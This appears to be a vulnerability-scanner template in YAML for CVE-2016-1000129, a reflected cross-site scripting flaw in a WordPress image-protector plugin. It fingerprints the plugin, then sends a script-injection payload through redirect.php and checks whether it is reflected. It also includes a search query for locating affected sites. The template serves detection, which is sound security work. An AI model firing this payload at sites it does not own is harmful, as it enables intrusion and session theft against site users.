flow: http(1) && http(2)
http:
- matchers:
  - internal: true
    type: word
    words:
    - Defa Online Image Protector
  raw:
  - 'GET /wp-content/plugins/defa-online-image-protector/readme.txt HTTP/1.1

    Host: {{Hostname}}

    '
- matchers:
  - part: body
    type: word
    words:
    - </script><script>alert(document.domain)</script>
  - part: header
    type: word
    words:
    - text/html
  - status:
    - 200
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/wp-content/plugins/defa-online-image-protector/redirect.php?r=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E'
id: CVE-2016-1000129
info:
  author: daffainfo
  classification:
    cpe: cpe:2.3:a:defa-online-image-protector_project:defa-online-image-protector:*:*:*:*:*:wordpress:*:*
    cve-id: CVE-2016-1000129
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cwe-id: CWE-79
    epss-percentile: 0.85585
    epss-score: 0.02773
  description: WordPress defa-online-image-protector 3.3 and before contains a reflected
    cross-site scripting vulnerability which allows an attacker to execute arbitrary
    script code in the browser of an unsuspecting user in the context of the affected
    site. This can allow the attacker to steal cookie-based authentication credentials
    and launch other attacks.
  impact: 'Successful exploitation of this vulnerability could allow an attacker to
    execute arbitrary JavaScript code in the context of the victim''s browser, potentially
    leading to session hijacking, defacement, or theft of sensitive information.

    '
  metadata:
    framework: wordpress
    google-query: inurl:"/wp-content/plugins/defa-online-image-protector"
    max-request: 2
    product: defa-online-image-protector
    vendor: defa-online-image-protector_project
  name: WordPress defa-online-image-protector <=3.3 - Cross-Site Scripting
  reference:
  - https://wordpress.org/plugins/defa-online-image-protector
  - http://www.vapidlabs.com/wp/wp_advisory.php?v=449
  - https://nvd.nist.gov/vuln/detail/CVE-2016-1000129
  - https://github.com/ARPSyndicate/cvemon
  - https://github.com/ARPSyndicate/kenzer-templates
  remediation: 'Update to the latest version of the WordPress defa-online-image-protector
    plugin (version 3.3 or higher) to mitigate this vulnerability.

    '
  severity: medium
  tags: cve2016,cve,wordpress,xss,wp-plugin,defa-online-image-protector_project,vuln
